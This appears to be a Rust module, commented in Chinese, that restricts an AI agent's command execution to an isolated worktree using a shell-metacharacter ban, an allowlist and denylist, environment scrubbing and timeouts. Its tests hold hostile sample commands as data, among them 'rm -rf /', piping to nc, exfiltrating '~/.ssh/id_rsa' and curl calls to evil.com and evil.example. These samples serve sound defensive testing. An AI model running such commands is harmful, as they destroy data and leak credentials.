//! B2 命令执行:让 Agent 能在隔离工作区里**验证自己写的代码**。
//!
//! ## 为什么必须有
//!
//! 在此之前工具集只有读写文件五件套。Agent 能改代码,却**没有任何办法知道
//! 改完还能不能编译**——它写完就交,人在审批队列里收到一份从未跑过的 diff。
//! 「产出经人裁决」于是退化成「人替机器当编译器」。
//!
//! ## 为什么必须收紧
//!
//! 命令执行是整个系统最危险的一件能力:它一步就能越过前面所有的路径圈禁、
//! 密级路由和外发记账。所以这里的默认姿态是**拒绝**,放行要满足全部四条:
//!
//! 1. **不经 shell**。不拼 `sh -c`,argv 直接交给 `Command`;命令行里出现
//!    任何 shell 元字符(`; | & $ > < ` ( ) 换行`)一律拒绝。没有解释器,
//!    就没有注入。
//! 2. **允许清单是「程序 + 子命令」前缀**,不是光看程序名。`cargo` 放行等于
//!    连 `cargo publish`、`cargo install` 一起放行;`cargo test` 才是一条规则。
//!    另有一张**否决清单**凌驾于允许清单之上(见 [`DENY`]),防的是把策略
//!    配错的那一天。
//! 3. **环境变量按白名单透传**。这是本模块最要紧的一条:进程环境里躺着
//!    `KIMI_API_KEY`、`GITHUB_TOKEN`、`SSH_AUTH_SOCK`。`cargo test` 会执行
//!    仓库里的 `build.rs` 和测试代码——那是**工作区里的代码**,而工作区正是
//!    Agent 刚写过的地方。黑名单永远漏掉一个,所以这里只放行明确列出的那几个。
//! 4. **超时 + 输出封顶**。卡住的进程会被杀掉并如实记为超时,不把整个 run 拖死。
//!
//! ## 诚实边界:网络
//!
//! **本模块不能保证被执行的命令不出网。** 能做的都做了(剥掉代理与凭据变量、
//! `CARGO_NET_OFFLINE=1`、`GIT_TERMINAL_PROMPT=0`、否决 push/publish/install),
//! 但 `cargo test` 跑的是工作区里的任意代码,它想 connect 就能 connect。
//! 真正的封堵在进程之外——macOS 的 `sandbox-exec`、Linux 的 network namespace,
//! 或总体规划里那一层「操作系统防火墙」。在补上之前,这一条按铁律四的口径记账:
//! **测不到就不算作零**,命令执行的外发对 `model.call` 的字节统计是不可见的,
//! 演习报告不应把它读成「零外发」。

use std::collections::BTreeMap;
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use muster_audit::{ContentHash, EventBody};

/// 输出封顶。超出时保留**头部**(第一条编译错误)与**尾部**(测试汇总),
/// 中间挖掉——两端恰好是模型最需要的两处。
const OUTPUT_CAP: usize = 6_000;
const HEAD_KEEP: usize = 2_000;

/// shell 元字符:出现即拒。命令不经 shell,这些字符只会被当成普通参数,
/// 与模型的意图不符 ⇒ 与其安静地按字面执行,不如明说拒绝。
const SHELL_META: &[char] = &[';', '|', '&', '$', '>', '<', '`', '(', ')', '\n', '\r', '*', '?', '!'];

/// 否决清单,**凌驾于允许清单**。共同点:效果在隔离工作区**之外**——
/// 改远端、改全局、碰凭据。worktree 隔离对它们一概无效,所以不由策略决定。
const DENY: &[&[&str]] = &[
    &["cargo", "publish"],
    &["cargo", "install"],
    &["cargo", "login"],
    &["cargo", "owner"],
    &["cargo", "yank"],
    &["git", "push"],
    &["git", "remote"],
    &["git", "config"],
    &["git", "credential"],
    &["npm", "publish"],
    &["npm", "login"],
    &["npm", "install"], // 装依赖 = 拉网 + 改 node_modules,属环境准备不属验证
    &["pip", "install"],
];

/// 默认允许清单:**用于验证工作的命令**。共同点是「跑一下看对不对」,
/// 而不是「改变世界」。跨语言是明确要求,不只服务 Rust。
const DEFAULT_ALLOW: &[&str] = &[
    // Rust
    "cargo check",
    "cargo test",
    "cargo build",
    "cargo clippy",
    "cargo fmt",
    // 只读 git(写历史归 Runner,合入归审批)
    "git status",
    "git diff",
    "git log",
    "git show",
    // Node / 前端
    "npm test",
    "npm run",
    "pnpm test",
    "pnpm run",
    "yarn test",
    "node --version",
    "tsc",
    // Python
    "pytest",
    "python3 -m pytest",
    "python3 -m unittest",
    "ruff",
    // Go
    "go test",
    "go build",
    "go vet",
];

/// 透传给子进程的环境变量白名单。**不在此列的一律不传**,
/// 包括所有 `*_API_KEY` / `*_TOKEN` / `*_SECRET` / `*_PROXY` / `SSH_AUTH_SOCK`。
/// 用白名单而非黑名单:黑名单总会漏掉下一个新出现的变量名。
const ENV_KEEP: &[&str] = &[
    "PATH", "HOME", "USER", "LOGNAME", "TMPDIR", "TEMP", "TMP", "LANG", "LC_ALL", "TERM", "SHLVL",
    // 工具链自身的安装位置
    "CARGO_HOME", "RUSTUP_HOME", "RUSTUP_TOOLCHAIN", "GOPATH", "GOROOT", "GOCACHE", "GOMODCACHE",
    "JAVA_HOME", "PYENV_ROOT", "NVM_DIR", "VOLTA_HOME",
];

/// 强制注入的环境:关掉网络与交互,避免子进程在无人值守时卡在提示符上。
const ENV_FORCE: &[(&str, &str)] = &[
    ("CARGO_NET_OFFLINE", "1"),
    ("GIT_TERMINAL_PROMPT", "0"),
    ("GIT_ASKPASS", ""),
    ("SSH_ASKPASS", ""),
    ("CI", "1"),
    ("NO_COLOR", "1"),
    ("TERM", "dumb"),
    ("PYTHONDONTWRITEBYTECODE", "1"),
];

#[derive(Debug, Clone)]
pub struct CommandPolicy {
    /// 允许清单,每条是「程序 + 若干子命令」的前缀,空格分词。
    pub allow: Vec<String>,
    pub timeout: Duration,
}

impl Default for CommandPolicy {
    fn default() -> Self {
        Self {
            allow: DEFAULT_ALLOW.iter().map(|s| s.to_string()).collect(),
            timeout: Duration::from_secs(180),
        }
    }
}

impl CommandPolicy {
    /// 自定策略(如 Capsule 里声明的 `shell.allow`)。否决清单仍然生效。
    pub fn with_allow<I: IntoIterator<Item = S>, S: Into<String>>(allow: I) -> Self {
        Self { allow: allow.into_iter().map(Into::into).collect(), ..Self::default() }
    }

    /// 公示给模型的允许清单文案。
    pub fn allow_text(&self) -> String {
        self.allow.join(" / ")
    }
}

/// 一次执行的结果:给模型看的文本 + 给审计留的证据。
pub struct CommandOutcome {
    pub text: String,
    pub audit: EventBody,
}

/// 分词:按空白切分,不做任何 shell 展开(无引号、无通配、无变量)。
fn tokenize(line: &str) -> Result<Vec<String>, String> {
    if let Some(c) = line.chars().find(|c| SHELL_META.contains(c)) {
        return Err(format!(
            "拒绝:命令含 shell 元字符「{c}」。命令不经 shell 执行,管道/重定向/变量替换一概不支持;\
             请只给一条单独的命令。"
        ));
    }
    let toks: Vec<String> = line.split_whitespace().map(String::from).collect();
    if toks.is_empty() {
        return Err("拒绝:空命令".into());
    }
    Ok(toks)
}

fn matches_rule(toks: &[String], rule_words: &[&str]) -> bool {
    rule_words.len() <= toks.len() && rule_words.iter().zip(toks).all(|(w, t)| *w == t.as_str())
}

/// 策略判定。返回命中的允许条目,或(拒绝分类, 给模型的说明)。
fn authorize(toks: &[String], policy: &CommandPolicy) -> Result<String, (String, String)> {
    for d in DENY {
        if matches_rule(toks, d) {
            return Err((
                "denied".into(),
                format!(
                    "拒绝:`{}` 在否决清单上。它的作用范围超出本次任务的隔离工作区\
                     (改远端 / 改全局 / 碰凭据),隔离保护不到,因此任何策略都不放行。",
                    d.join(" ")
                ),
            ));
        }
    }
    for rule in &policy.allow {
        let words: Vec<&str> = rule.split_whitespace().collect();
        if matches_rule(toks, &words) {
            return Ok(rule.clone());
        }
    }
    Err((
        "not_allowed".into(),
        format!(
            "拒绝:`{}` 不在允许清单上。当前可用:{}",
            toks.join(" "),
            policy.allow_text()
        ),
    ))
}

/// 剥干净的环境:白名单透传 + 强制注入。
fn clean_env() -> BTreeMap<String, String> {
    let mut env: BTreeMap<String, String> = ENV_KEEP
        .iter()
        .filter_map(|k| std::env::var(k).ok().map(|v| (k.to_string(), v)))
        .collect();
    for (k, v) in ENV_FORCE {
        env.insert(k.to_string(), v.to_string());
    }
    env
}

fn cap(out: &str) -> String {
    if out.len() <= OUTPUT_CAP {
        return out.to_string();
    }
    let head = out.char_indices().map(|(i, _)| i).take_while(|i| *i <= HEAD_KEEP).last().unwrap_or(0);
    let tail_from = out
        .char_indices()
        .map(|(i, _)| i)
        .find(|i| *i >= out.len().saturating_sub(OUTPUT_CAP - HEAD_KEEP))
        .unwrap_or(out.len());
    format!(
        "{}\n…(输出共 {} 字节,中间省略 {} 字节;两端保留:开头是首条错误,结尾是汇总)…\n{}",
        &out[..head],
        out.len(),
        tail_from - head,
        &out[tail_from..]
    )
}

/// 在 `cwd` 里执行一条命令。`cwd` 必须是本次任务的隔离 worktree——
/// 调用方(ToolSet)保证这一点。
pub fn run(line: &str, cwd: &Path, policy: &CommandPolicy) -> CommandOutcome {
    let command_hash = ContentHash::sha256(line.as_bytes());
    let refuse = |kind: &str, text: String| CommandOutcome {
        audit: EventBody::CommandRun {
            rule: None,
            command_hash: command_hash.clone(),
            refused: Some(kind.into()),
            exit_code: None,
            timed_out: false,
            duration_ms: 0,
            output_bytes: 0,
        },
        text,
    };

    let toks = match tokenize(line) {
        Ok(t) => t,
        Err(e) => return refuse("shell_meta", e),
    };
    let rule = match authorize(&toks, policy) {
        Ok(r) => r,
        Err((kind, msg)) => return refuse(&kind, msg),
    };

    let started = Instant::now();
    let mut cmd = Command::new(&toks[0]);
    cmd.args(&toks[1..])
        .current_dir(cwd)
        .env_clear()
        .envs(clean_env())
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            return CommandOutcome {
                text: format!("无法启动 `{}`:{e}", toks[0]),
                audit: EventBody::CommandRun {
                    rule: Some(rule),
                    command_hash,
                    refused: Some("spawn_failed".into()),
                    exit_code: None,
                    timed_out: false,
                    duration_ms: started.elapsed().as_millis() as u64,
                    output_bytes: 0,
                },
            };
        }
    };

    // 超时轮询。杀掉后仍收尸(wait),不留僵尸进程。
    let mut timed_out = false;
    let status = loop {
        match child.try_wait() {
            Ok(Some(s)) => break Some(s),
            Ok(None) => {
                if started.elapsed() >= policy.timeout {
                    let _ = child.kill();
                    let _ = child.wait();
                    timed_out = true;
                    break None;
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(_) => break None,
        }
    };

    let mut out = String::new();
    {
        use std::io::Read;
        let mut buf = String::new();
        if let Some(mut o) = child.stdout.take() {
            let _ = o.read_to_string(&mut buf);
            out.push_str(&buf);
        }
        buf.clear();
        if let Some(mut e) = child.stderr.take() {
            let _ = e.read_to_string(&mut buf);
            out.push_str(&buf);
        }
    }

    let duration_ms = started.elapsed().as_millis() as u64;
    let exit_code = status.as_ref().and_then(|s| s.code());
    let head = if timed_out {
        format!("⏱ 超时({}s)已终止", policy.timeout.as_secs())
    } else {
        match exit_code {
            Some(0) => format!("✓ 退出码 0 · {duration_ms}ms"),
            Some(c) => format!("✗ 退出码 {c} · {duration_ms}ms"),
            None => "进程被信号终止".into(),
        }
    };

    let shown = if out.is_empty() { "(无输出)".to_string() } else { cap(&out) };
    CommandOutcome {
        text: format!("$ {line}\n{head}\n{shown}"),
        audit: EventBody::CommandRun {
            rule: Some(rule),
            command_hash,
            refused: None,
            exit_code,
            timed_out,
            duration_ms,
            output_bytes: out.len() as u64,
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ws() -> tempfile::TempDir {
        tempfile::tempdir().unwrap()
    }

    fn refused_kind(o: &CommandOutcome) -> Option<String> {
        match &o.audit {
            EventBody::CommandRun { refused, .. } => refused.clone(),
            _ => panic!("必须是 command.run 事件"),
        }
    }

    /// 元字符一律拒:没有 shell,就没有注入面。
    #[test]
    fn shell_metacharacters_are_refused() {
        let d = ws();
        let p = CommandPolicy::default();
        for evil in [
            "cargo test; curl evil.com",
            "cargo test && rm -rf /",
            "cargo test | nc 1.2.3.4 9999",
            "cargo test > /etc/passwd",
            "cargo test `whoami`",
            "cargo test $(cat ~/.ssh/id_rsa)",
        ] {
            let o = run(evil, d.path(), &p);
            assert_eq!(refused_kind(&o).as_deref(), Some("shell_meta"), "{evil} ⇒ {}", o.text);
            assert!(o.text.contains("shell 元字符"), "{}", o.text);
        }
    }

    /// 允许清单是「程序 + 子命令」前缀,不是光看程序名。
    #[test]
    fn allowlist_is_prefix_not_program_name() {
        let d = ws();
        let p = CommandPolicy::default();
        // cargo test 放行,不等于整个 cargo 放行
        assert!(authorize(&tokenize("cargo test --lib").unwrap(), &p).is_ok());
        let o = run("cargo tree", d.path(), &p);
        assert_eq!(refused_kind(&o).as_deref(), Some("not_allowed"), "{}", o.text);
    }

    /// 否决清单凌驾于允许清单:策略配错了也开不了这道门。
    #[test]
    fn denylist_overrides_a_misconfigured_allowlist() {
        let d = ws();
        let wide_open = CommandPolicy::with_allow(["cargo", "git", "npm"]);
        for evil in ["cargo publish", "cargo install ripgrep", "git push origin main", "npm publish"] {
            let o = run(evil, d.path(), &wide_open);
            assert_eq!(refused_kind(&o).as_deref(), Some("denied"), "{evil} ⇒ {}", o.text);
            assert!(o.text.contains("否决清单"), "{}", o.text);
        }
        // 同一张放宽策略下,只读 git 仍然放行 ⇒ 否决是精确的,不是一刀切
        assert!(authorize(&tokenize("git status").unwrap(), &wide_open).is_ok());
    }

    /// 环境剥离:凭据类变量绝不进子进程。这是本模块最要紧的一条。
    #[test]
    fn secrets_never_reach_the_child_process() {
        // SAFETY: 单测内设置进程环境;仅本测试读取。
        unsafe {
            std::env::set_var("KIMI_API_KEY", "sk-should-never-leak");
            std::env::set_var("GITHUB_TOKEN", "ghp_should_never_leak");
            std::env::set_var("HTTPS_PROXY", "http://should-never-leak");
            std::env::set_var("SSH_AUTH_SOCK", "/tmp/should-never-leak");
        }
        let env = clean_env();
        for leaked in ["KIMI_API_KEY", "GITHUB_TOKEN", "HTTPS_PROXY", "SSH_AUTH_SOCK"] {
            assert!(!env.contains_key(leaked), "{leaked} 泄漏进了子进程环境");
        }
        assert!(env.contains_key("PATH"), "PATH 必须透传,否则什么都跑不起来");
        assert_eq!(env.get("CARGO_NET_OFFLINE").map(String::as_str), Some("1"));
        assert_eq!(env.get("GIT_TERMINAL_PROMPT").map(String::as_str), Some("0"));

        // 端到端确认:子进程自己看到的环境里真的没有
        let d = ws();
        let p = CommandPolicy::with_allow(["/usr/bin/env"]);
        let o = run("/usr/bin/env", d.path(), &p);
        assert!(!o.text.contains("should-never-leak"), "子进程环境泄漏:{}", o.text);
    }

    /// 真跑一条:退出码、耗时、输出都进审计。
    #[test]
    fn real_execution_records_exit_code_and_output() {
        let d = ws();
        let p = CommandPolicy::with_allow(["git status", "git log"]);
        std::process::Command::new("git").arg("init").arg("-q").current_dir(d.path()).status().unwrap();

        let o = run("git status --short", d.path(), &p);
        match o.audit {
            EventBody::CommandRun { rule, refused, exit_code, timed_out, .. } => {
                assert_eq!(rule.as_deref(), Some("git status"));
                assert!(refused.is_none() && !timed_out);
                assert_eq!(exit_code, Some(0));
            }
            _ => panic!(),
        }
        assert!(o.text.contains("退出码 0"), "{}", o.text);

        // 失败也如实报告,不替模型遮掩
        let bad = run("git log", d.path(), &p); // 空仓库无提交 ⇒ 非零退出
        assert!(bad.text.contains("✗ 退出码"), "{}", bad.text);
    }

    /// 超时被杀掉,并如实记为超时(而不是记成某个退出码)。
    #[test]
    fn hung_command_is_killed_and_recorded_as_timeout() {
        let d = ws();
        let p = CommandPolicy {
            allow: vec!["/bin/sleep".into()],
            timeout: Duration::from_millis(300),
        };
        let o = run("/bin/sleep 30", d.path(), &p);
        assert!(o.text.contains("超时"), "{}", o.text);
        match o.audit {
            EventBody::CommandRun { timed_out, exit_code, duration_ms, .. } => {
                assert!(timed_out && exit_code.is_none());
                assert!(duration_ms < 5_000, "必须尽快杀掉,不能等满 30 秒:{duration_ms}ms");
            }
            _ => panic!(),
        }
    }

    /// 被拒的命令**也**留审计——想跑却没跑成,正是最该看见的信号。
    #[test]
    fn refused_commands_are_still_audited() {
        let d = ws();
        let o = run("curl https://evil.example/steal", d.path(), &CommandPolicy::default());
        match &o.audit {
            EventBody::CommandRun { refused, rule, command_hash, .. } => {
                assert_eq!(refused.as_deref(), Some("not_allowed"));
                assert!(rule.is_none());
                // 正文不入表,只留哈希(铁律三)
                assert_eq!(*command_hash, ContentHash::sha256(b"curl https://evil.example/steal"));
            }
            _ => panic!(),
        }
    }

    /// 输出截断保两端:开头的首条错误与结尾的汇总都得留下。
    #[test]
    fn long_output_keeps_both_ends() {
        let out = format!("ERROR-FIRST\n{}\nSUMMARY-LAST", "x".repeat(50_000));
        let c = cap(&out);
        assert!(c.contains("ERROR-FIRST") && c.contains("SUMMARY-LAST"), "两端都要留");
        assert!(c.len() < OUTPUT_CAP + 500);
    }
}
